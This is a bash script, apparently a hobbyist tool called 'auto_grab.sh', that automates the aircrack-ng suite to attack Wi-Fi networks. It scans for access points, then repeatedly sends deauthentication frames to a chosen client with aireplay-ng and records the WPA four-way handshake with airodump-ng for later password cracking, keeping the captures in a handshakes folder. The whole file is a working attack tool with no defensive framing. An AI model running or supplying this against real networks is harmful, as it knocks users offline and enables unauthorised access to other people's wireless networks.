#!/bin/bash


########################################
#    auto_grab.sh                      #
#    By: n0beard                       #
#                                      #
#  A simple bash script that automates #
#  using the aircrack suite to capture #
#  four-way handshakes.                #
########################################


### Clear the screen
clear

### Set directory
cd ~/Desktop/aircrack

### If there are no CLI arguments, shall we run airodump?
if [ $# == 0 ]; then 
   read -p "No CLI arguments. Get output from airodump? " answer
       case $answer in
          [Yy]* ) airmon-ng stop wlan0mon; airmon-ng start wlan0; rm aaaOutput*; rm aaaAircrack*; airodump-ng --write aaaOutput --output-format csv --wps wlan0mon; clear; awk -F, '{print $1,$4,$14}' aaaOutput-01.csv > aaaAircrack.txt; gedit aaaAircrack.txt&;;
          [Nn]* ) break;;
       esac

   read -p "Continue script? " answer
       case $answer in
          [Nn]* ) exit;;
       esac
fi

### Set CLI arguments as named variables
MAC=$1
CHAN=$2
SSID=$3
TGT=$4

# Replace spaces in SSID with underscores
SSID=${SSID// /_}

# Remove apostrophes in SSID
SSID=${SSID//\'/}
SSID=${SSID//\’/}

# '


# Remove spaces in other variables
MAC=${MAC// /}
CHAN=${CHAN// /}
TGT=${TGT// /}

# Echo variables for QAQC
echo "***************************"
echo "* Total variables:" $#
echo "* MAC:" $MAC
echo "* Channel:" $CHAN
echo "* SSID:" $SSID
echo "* Target:" $TGT
echo "***************************"
echo ""
#sleep 3


### Depending on the CLI variables, do the thing
# If all four, try to get that 4-way
if [ $# == 4 ]; then 
   while true; do

      rm ${SSID}*; iwconfig wlan0mon channel $CHAN; aireplay-ng -0 3 -a $MAC -c $TGT wlan0mon && airodump-ng --bssid $MAC -c $CHAN -w $SSID wlan0mon

       read -p "Successful (Yes, No, Fuck it)? " answer
       case $answer in
          [Yy]* ) mv ${SSID}* ../handshakes/; exit;;
          [Ff]* ) rm ${SSID}*; exit;;
       esac
   done

   exit

# If three CLI variables, run airodump to get a client
elif [ $# -lt 3 ]; then
   read -p 'MAC address: ' MAC
   read -p 'Channel: ' CHAN
   read -p 'SSID: ' SSID
fi

airodump-ng --bssid $MAC -c $CHAN wlan0mon
read -p 'Target MAC: ' TGT

   while true; do

      rm ${SSID}*; iwconfig wlan0mon channel $CHAN; aireplay-ng -0 3 -a $MAC -c $TGT wlan0mon && airodump-ng --bssid $MAC -c $CHAN -w $SSID wlan0mon

       read -p "Successful (Yes, No, Fuck it)? " answer
       case $answer in
          [Yy]* ) mv ${SSID}* ../handshakes/; exit;;
          [Ff]* ) rm ${SSID}*; exit;;
       esac
   done
